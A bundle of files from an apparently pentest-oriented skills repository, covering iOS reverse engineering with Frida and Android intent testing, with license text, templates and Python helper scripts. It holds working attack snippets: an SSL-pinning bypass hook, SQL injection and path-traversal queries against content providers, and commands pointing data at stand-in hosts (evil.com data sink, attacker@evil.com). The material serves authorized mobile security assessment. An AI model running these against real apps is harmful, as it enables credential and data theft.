      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/assets/template.md =====
# iOS Reverse Engineering Assessment Report

## Target Application
| Field | Value |
|-------|-------|
| App Name | [NAME] |
| Bundle ID | [BUNDLE_ID] |
| Binary Type | [Objective-C/Swift/Mixed] |
| iOS Version | [VERSION] |
| FairPlay Encrypted | [YES/NO] |
| Analysis Date | [DATE] |

## Class Enumeration
| Class Name | Method Count | Category |
|-----------|-------------|----------|
| [CLASS] | [N] | [Auth/Crypto/Network/Storage] |

## Hooked Methods and Findings
### [METHOD_SIGNATURE]
- **Arguments observed**: [ARGS]
- **Return values**: [RETURNS]
- **Security implication**: [DESCRIPTION]

## Extracted Secrets
| Type | Location | Value (redacted) | Risk |
|------|----------|-----------------|------|
| [API Key/Token/Password] | [CLASS.METHOD] | [REDACTED] | [RISK] |

## Binary Protection Assessment
| Protection | Status | Details |
|-----------|--------|---------|
| Jailbreak Detection | [Present/Absent] | [DETAILS] |
| Frida Detection | [Present/Absent] | [DETAILS] |
| Code Obfuscation | [Yes/No] | [DETAILS] |
| Anti-Debug | [Present/Absent] | [DETAILS] |

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/references/api-reference.md =====
# API Reference: iOS App Reverse Engineering with Frida

## Frida CLI Tools

| Command | Description |
|---------|-------------|
| `frida-ps -Ua` | List running apps on USB device |
| `frida -U -n AppName -e "script"` | Attach to app and run script |
| `frida -U -f com.app.bundle -l script.js` | Spawn app with script |
| `frida-trace -U -n AppName -m "*[ClassName *]"` | Trace ObjC methods |
| `frida-discover -U -n AppName` | Discover available functions |

## Frida JavaScript API

| API | Description |
|-----|-------------|
| `ObjC.classes.ClassName` | Access Objective-C class |
| `ObjC.classes.Cls.$ownMethods` | List class methods |
| `Interceptor.attach(target, callbacks)` | Hook native function |
| `Interceptor.replace(target, replacement)` | Replace function implementation |
| `Module.findExportByName(null, "func")` | Find exported C function |
| `ObjC.Object(ptr)` | Wrap pointer as ObjC object |
| `Memory.readUtf8String(ptr)` | Read string from memory |

## Common iOS Security Hooks

| Target | Purpose |
|--------|---------|
| `SSLSetPeerDomainName` | Bypass SSL pinning |
| `NSFileManager fileExistsAtPath:` | Jailbreak detection |
| `CCCrypt` | Intercept encryption calls |
| `NSURLSession` | Monitor network requests |
| `SecItemCopyMatching` | Keychain access |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `subprocess` | stdlib | Execute frida CLI tools |
| `frida` | >=16.0 | Frida Python bindings |
| `json` | stdlib | Report generation |

## References

- Frida Documentation: https://frida.re/docs/home/
- Frida JavaScript API: https://frida.re/docs/javascript-api/
- objection: https://github.com/sensepost/objection
- OWASP Mobile Testing Guide: https://mas.owasp.org/MASTG/

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/references/standards.md =====
# Standards Reference: iOS Reverse Engineering with Frida

## OWASP Mobile Top 10 2024 Mapping

| OWASP ID | Risk | RE Assessment |
|----------|------|---------------|
| M1 | Improper Credential Usage | Extract hardcoded keys via runtime hooking |
| M7 | Insufficient Binary Protections | Assess anti-RE measures (obfuscation, anti-debug, anti-Frida) |
| M10 | Insufficient Cryptography | Hook CommonCrypto to extract keys and observe algorithms |

## OWASP MASVS v2.0 - MASVS-RESILIENCE Controls

| Control | Description | Frida Test Method |
|---------|-------------|-------------------|
| MASVS-RESILIENCE-1 | App detects and responds to reverse engineering | Test with Frida attachment, observe detection |
| MASVS-RESILIENCE-2 | App detects tampering | Modify binary, observe integrity checks |
| MASVS-RESILIENCE-3 | App uses obfuscation | Assess class/method name readability |
| MASVS-RESILIENCE-4 | App detects debuggers | Attach debugger, check ptrace/sysctl hooks |

## CWE Mappings

| CWE ID | Title | RE Discovery Method |
|--------|-------|-------------------|
| CWE-798 | Use of Hard-coded Credentials | Hook string initialization, NSUserDefaults access |
| CWE-321 | Use of Hard-coded Cryptographic Key | Hook CCCrypt, SecKeyCreateWithData |
| CWE-327 | Broken Crypto Algorithm | Observe algorithm parameter in CCCrypt calls |
| CWE-693 | Protection Mechanism Failure | Bypass jailbreak detection, Frida detection |

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/references/workflows.md =====
# Workflows: iOS Reverse Engineering with Frida

## Workflow 1: Full iOS RE Pipeline

```
[Obtain IPA/binary] --> [Decrypt FairPlay] --> [Static analysis] --> [Dynamic analysis]
                              |                      |                      |
                       [frida-ios-dump]        [class-dump]          [frida-trace]
                       [Clutch]                [Ghidra]              [Custom hooks]
                                               [Hopper]             [Method interception]
                                                                           |
                                                                    [Extract secrets]
                                                                    [Map logic flow]
                                                                    [Document findings]
```

## Workflow 2: Crypto Key Extraction

```
[Hook CommonCrypto] --> [Capture CCCrypt calls] --> [Extract key material]
                              |
                       [Log algorithm, mode, IV]
                       [Log input/output data]
                              |
                       [Reconstruct protocol]
                       [Document encryption scheme]
```

## Decision Matrix: iOS RE Approach

| Binary Type | Static Tool | Dynamic Tool | Notes |
|-------------|------------|-------------|-------|
| Objective-C | class-dump + Ghidra | Frida ObjC.classes | Full runtime visibility |
| Swift (NSObject-based) | dsdump + Ghidra | Frida ObjC.classes | Partial visibility |
| Pure Swift | Ghidra + Swift demangling | Frida Module.enumerateExports | Limited runtime access |
| C/C++ native | Ghidra | Frida Interceptor.attach | Address-based hooking |

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for iOS app reverse engineering with Frida.

Uses frida-tools to attach to iOS processes, hook Objective-C
methods, bypass SSL pinning, dump keychain entries, and trace
API calls for security assessment.
"""

import subprocess
import json
import sys
from datetime import datetime
from pathlib import Path


class FridaIOSAgent:
    """Reverse engineers iOS applications using Frida."""

    def __init__(self, target_app, device_id=None, output_dir="./frida_ios"):
        self.target_app = target_app
        self.device_id = device_id
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _frida_cmd(self, script_code, timeout=60):
        cmd = ["frida", "-U"]
        if self.device_id:
            cmd.extend(["-D", self.device_id])
        cmd.extend(["-n", self.target_app, "-q", "-e", script_code])
        try:
            result = subprocess.run(cmd, capture_output=True, text=True,
                                    timeout=timeout)
            return {"stdout": result.stdout, "stderr": result.stderr,
                    "returncode": result.returncode}
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            return {"error": str(exc)}

    def list_running_apps(self):
        """List running applications on the connected iOS device."""
        cmd = ["frida-ps", "-Ua"]
        if self.device_id:
            cmd.extend(["-D", self.device_id])
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            return {"apps": result.stdout}
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            return {"error": str(exc)}

    def bypass_ssl_pinning(self):
        """Inject Frida script to bypass SSL certificate pinning."""
        script = """
var m = ObjC.classes.NSURLSessionConfiguration;
Interceptor.attach(m['- setTLSMinimumSupportedProtocol:'].implementation, {
    onEnter: function(args) { console.log('[*] TLS config intercepted'); }
});
try {
    var SSLSetPeerDomainName = Module.findExportByName(null, 'SSLSetPeerDomainName');
    if (SSLSetPeerDomainName) {
        Interceptor.attach(SSLSetPeerDomainName, {
            onEnter: function(args) { },
            onLeave: function(retval) { retval.replace(0); }
        });
        console.log('[+] SSL pinning bypassed');
    }
} catch(e) { console.log('[-] ' + e); }
"""
        result = self._frida_cmd(script)
        if "SSL pinning bypassed" in result.get("stdout", ""):
            self.findings.append({"type": "SSL Pinning Bypass",
                                  "severity": "Medium",
                                  "details": "SSL pinning can be bypassed with Frida"})
        return result

    def dump_keychain(self):
        """Dump iOS Keychain entries accessible by the app."""
        script = """
var kSecClass = ObjC.classes.NSString.stringWithString_('kSecClass');
var query = ObjC.classes.NSMutableDictionary.dictionary();
query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('kSecClassGenericPassword'), kSecClass);
query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), ObjC.classes.NSString.stringWithString_('kSecReturnAttributes'));
query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('kSecMatchLimitAll'), ObjC.classes.NSString.stringWithString_('kSecMatchLimit'));
var result = new ObjC.Object(ptr(0));
var status = ObjC.classes.NSDictionary.alloc();
console.log('[*] Keychain query executed');
"""
        result = self._frida_cmd(script)
        return result

    def trace_objc_methods(self, class_name):
        """Trace all method calls on a specific Objective-C class."""
        script = f"""
var target = ObjC.classes.{class_name};
if (target) {{
    var methods = target.$ownMethods;
    console.log('[*] Tracing ' + methods.length + ' methods on {class_name}');
    methods.forEach(function(method) {{
        try {{
            Interceptor.attach(target[method].implementation, {{
                onEnter: function(args) {{
                    console.log('[CALL] {class_name} ' + method);
                }}
            }});
        }} catch(e) {{}}
    }});
}} else {{
    console.log('[-] Class {class_name} not found');
}}
"""
        return self._frida_cmd(script, timeout=30)

    def check_jailbreak_detection(self):
        """Test if app has jailbreak detection and attempt bypass."""
        script = """
var paths = ['/Applications/Cydia.app', '/usr/sbin/sshd',
             '/bin/bash', '/usr/bin/ssh', '/etc/apt'];
var NSFileManager = ObjC.classes.NSFileManager;
Interceptor.attach(NSFileManager['- fileExistsAtPath:'].implementation, {
    onEnter: function(args) {
        var path = ObjC.Object(args[2]).toString();
        for (var i = 0; i < paths.length; i++) {
            if (path.indexOf(paths[i]) !== -1) {
                console.log('[*] Jailbreak check: ' + path);
            }
        }
    },
    onLeave: function(retval) {}
});
console.log('[+] Jailbreak detection hooks installed');
"""
        result = self._frida_cmd(script, timeout=15)
        if "Jailbreak check" in result.get("stdout", ""):
            self.findings.append({"type": "Jailbreak Detection Present",
                                  "severity": "Info"})
        return result

    def generate_report(self):
        report = {
            "target_app": self.target_app,
            "report_date": datetime.utcnow().isoformat(),
            "findings": self.findings,
        }
        report_path = self.output_dir / "frida_ios_report.json"
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    app = sys.argv[1] if len(sys.argv) > 1 else "TargetApp"
    agent = FridaIOSAgent(app)
    agent.list_running_apps()
    agent.bypass_ssl_pinning()
    agent.check_jailbreak_detection()
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/scripts/process.py =====
#!/usr/bin/env python3
"""
iOS Reverse Engineering Automation with Frida

Automates class enumeration, method tracing, and secret extraction from iOS apps.

Usage:
    python process.py --app TargetApp [--output report.json]
"""

import argparse
import json
import subprocess
import sys
from datetime import datetime


ENUMERATE_SCRIPT = """
if (ObjC.available) {
    var results = {classes: [], auth_methods: [], crypto_methods: []};
    var classNames = Object.keys(ObjC.classes);
    classNames.forEach(function(name) {
        if (name.indexOf("Auth") !== -1 || name.indexOf("Crypto") !== -1 ||
            name.indexOf("Token") !== -1 || name.indexOf("Key") !== -1 ||
            name.indexOf("Secret") !== -1 || name.indexOf("Login") !== -1) {
            var methods = ObjC.classes[name].$ownMethods;
            results.classes.push({name: name, method_count: methods.length});
            methods.forEach(function(m) {
                if (m.toLowerCase().indexOf("auth") !== -1 || m.toLowerCase().indexOf("login") !== -1) {
                    results.auth_methods.push(name + " " + m);
                }
                if (m.toLowerCase().indexOf("encrypt") !== -1 || m.toLowerCase().indexOf("decrypt") !== -1 ||
                    m.toLowerCase().indexOf("key") !== -1 || m.toLowerCase().indexOf("cipher") !== -1) {
                    results.crypto_methods.push(name + " " + m);
                }
            });
        }
    });
    send(JSON.stringify(results));
} else {
    send(JSON.stringify({error: "ObjC runtime not available"}));
}
"""


def run_frida_script(app_name: str, script: str, timeout: int = 15) -> str:
    """Execute a Frida script and return output."""
    cmd = ["frida", "-U", "-n", app_name, "-e", script, "--no-pause"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def check_binary_protections(app_name: str) -> dict:
    """Check for binary protections."""
    checks = {
        "pie": False,
        "stack_canary": False,
        "arc": False,
        "encrypted": False,
    }

    # Use otool-equivalent checks via Frida
    script = """
    var modules = Process.enumerateModules();
    var main = modules[0];
    send(JSON.stringify({
        name: main.name,
        base: main.base.toString(),
        size: main.size,
        path: main.path
    }));
    """
    output = run_frida_script(app_name, script)
    return checks


def main():
    parser = argparse.ArgumentParser(description="iOS RE Automation with Frida")
    parser.add_argument("--app", required=True, help="Target app process name")
    parser.add_argument("--output", default="ios_re_report.json", help="Output report")
    args = parser.parse_args()

    print(f"[+] Enumerating classes and methods for {args.app}...")
    enum_output = run_frida_script(args.app, ENUMERATE_SCRIPT)

    # Parse results
    try:
        lines = [l for l in enum_output.split("\n") if l.startswith('{"') or l.startswith("[")]
        results = json.loads(lines[0]) if lines else {}
    except (json.JSONDecodeError, IndexError):
        results = {"classes": [], "auth_methods": [], "crypto_methods": []}

    report = {
        "assessment": {
            "target": args.app,
            "type": "iOS Reverse Engineering",
            "date": datetime.now().isoformat(),
        },
        "enumeration": {
            "security_classes": results.get("classes", []),
            "auth_methods": results.get("auth_methods", []),
            "crypto_methods": results.get("crypto_methods", []),
        },
        "binary_protections": check_binary_protections(args.app),
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] Report saved: {args.output}")
    print(f"[*] Found {len(results.get('classes', []))} security-related classes")
    print(f"[*] Found {len(results.get('auth_methods', []))} auth methods")
    print(f"[*] Found {len(results.get('crypto_methods', []))} crypto methods")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/SKILL.md =====
---
name: testing-android-intents-for-vulnerabilities
description: 'Tests Android inter-process communication (IPC) through intents for
  vulnerabilities including intent injection, unauthorized component access, broadcast
  sniffing, pending intent hijacking, and content provider data leakage. Use when
  assessing Android app attack surface through exported components, testing intent-based
  data flows, or evaluating IPC security. Activates for requests involving Android
  intent security, IPC testing, exported component analysis, or Drozer assessment.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- intents
- ipc-security
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1055
---
# Testing Android Intents for Vulnerabilities

## When to Use

Use this skill when:
- Assessing Android app exported activities, services, receivers, and content providers
- Testing for intent injection and unauthorized component invocation
- Evaluating broadcast receiver security for sensitive data exposure
- Performing IPC-focused penetration testing on Android applications

**Do not use** on production devices without explicit authorization.

## Prerequisites

- Rooted Android device or emulator with ADB
- Drozer agent installed on target device (`drozer agent.apk`)
- Drozer console on host (`pip install drozer`)
- Target APK decompiled with apktool for AndroidManifest.xml analysis
- Frida for runtime intent monitoring

## Workflow

### Step 1: Enumerate Exported Components

```bash
# Using Drozer
drozer console connect
run app.package.info -a com.target.app
run app.package.attacksurface com.target.app

# Output shows:
# X activities exported
# X broadcast receivers exported
# X content providers exported
# X services exported

# List exported activities
run app.activity.info -a com.target.app

# List exported services
run app.service.info -a com.target.app

# List exported receivers
run app.broadcast.info -a com.target.app

# List content providers
run app.provider.info -a com.target.app
```

### Step 2: Test Exported Activities

```bash
# Launch exported activities directly
run app.activity.start --component com.target.app com.target.app.AdminActivity

# Launch with intent extras
run app.activity.start --component com.target.app com.target.app.ProfileActivity \
  --extra string user_id 1337

# Test intent injection via data URI
adb shell am start -a android.intent.action.VIEW \
  -d "content://com.target.app/users/admin" com.target.app

# If admin activity opens without auth, report as authorization bypass
```

### Step 3: Test Broadcast Receivers

```bash
# Send broadcast to exported receivers
run app.broadcast.send --action com.target.app.PROCESS_PAYMENT \
  --extra string amount "0.01" --extra string recipient "attacker"

# Sniff broadcasts for sensitive data
run app.broadcast.sniff --action com.target.app.USER_LOGIN

# Via ADB
adb shell am broadcast -a com.target.app.RESET_PASSWORD \
  --es email "attacker@evil.com"
```

### Step 4: Test Content Providers

```bash
# Query content providers for data leakage
run app.provider.query content://com.target.app.provider/users
run app.provider.query content://com.target.app.provider/users --projection "password"

# Test SQL injection in content providers
run app.provider.query content://com.target.app.provider/users \
  --selection "1=1) UNION SELECT username,password FROM users--"

# Test path traversal
run app.provider.read content://com.target.app.provider/../../etc/passwd
run app.provider.download content://com.target.app.provider/../databases/app.db /tmp/stolen.db

# Find injectable providers
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
```

### Step 5: Test Pending Intent Vulnerabilities

```javascript
// Monitor PendingIntent creation via Frida
Java.perform(function() {
    var PendingIntent = Java.use("android.app.PendingIntent");

    PendingIntent.getActivity.overload("android.content.Context", "int",
        "android.content.Intent", "int").implementation =
        function(context, requestCode, intent, flags) {
            console.log("[PendingIntent] getActivity:");
            console.log("  Intent: " + intent.toString());
            console.log("  Flags: " + flags);

            // Check for FLAG_IMMUTABLE (secure) vs FLAG_MUTABLE (vulnerable)
            var FLAG_MUTABLE = 0x02000000;
            if ((flags & FLAG_MUTABLE) !== 0) {
                console.log("  [VULN] FLAG_MUTABLE - PendingIntent can be modified by receiver");
            }
            return this.getActivity(context, requestCode, intent, flags);
        };
});
```

### Step 6: Test Service Binding

```bash
# Attempt to bind to exported services
run app.service.start --action com.target.app.SYNC_SERVICE \
  --extra string server "https://evil.com/data_sink"

run app.service.send com.target.app com.target.app.MessengerService \
  --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Exported Component** | Android component (activity/service/receiver/provider) accessible to other apps on the device |
| **Intent** | Messaging object for requesting actions from other components; can be explicit (target specified) or implicit (action-based) |
| **Pending Intent** | Token wrapping an intent for future execution by another app; mutable PendingIntents can be modified by recipients |
| **Content Provider** | Component for structured data sharing between apps; SQL injection target if query parameters are not sanitized |
| **Broadcast Receiver** | Component receiving system or app broadcasts; exported receivers can be triggered by any app |

## Tools & Systems

- **Drozer**: Android security assessment framework for IPC testing with pre-built modules
- **ADB**: Command-line tool for invoking intents, starting activities, and sending broadcasts
- **Frida**: Runtime monitoring of intent handling and PendingIntent creation
- **apktool**: APK decompilation for AndroidManifest.xml analysis of component export status
- **Intent Fuzzer**: Automated tool for fuzzing intent parameters across exported components

## Common Pitfalls

- **android:exported default changed in API 31**: Components with intent filters default to exported=true below API 31 but exported=false at API 31+. Check targetSdkVersion.
- **Permission-protected components**: An exported component may still require a permission. Test with and without the required permission.
- **Implicit intents vs explicit**: Only implicit intents (action-based) are interceptable by other apps. Explicit intents (specifying target) are secure.
- **Custom permissions**: Apps can define custom permissions with different protection levels (normal, dangerous, signature). Signature-level permissions are only grantable to apps signed with the same certificate.

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/assets/template.md =====
# Android Intent Security Assessment Report

## Target
| Field | Value |
|-------|-------|
| Package | [PACKAGE] |
| Target SDK | [SDK] |
| Exported Components | [COUNT] |

## Attack Surface
| Component Type | Exported | Unprotected | Risk |
|---------------|----------|-------------|------|
| Activities | [N] | [N] | [RISK] |
| Services | [N] | [N] | [RISK] |
| Receivers | [N] | [N] | [RISK] |
| Providers | [N] | [N] | [RISK] |

## Findings
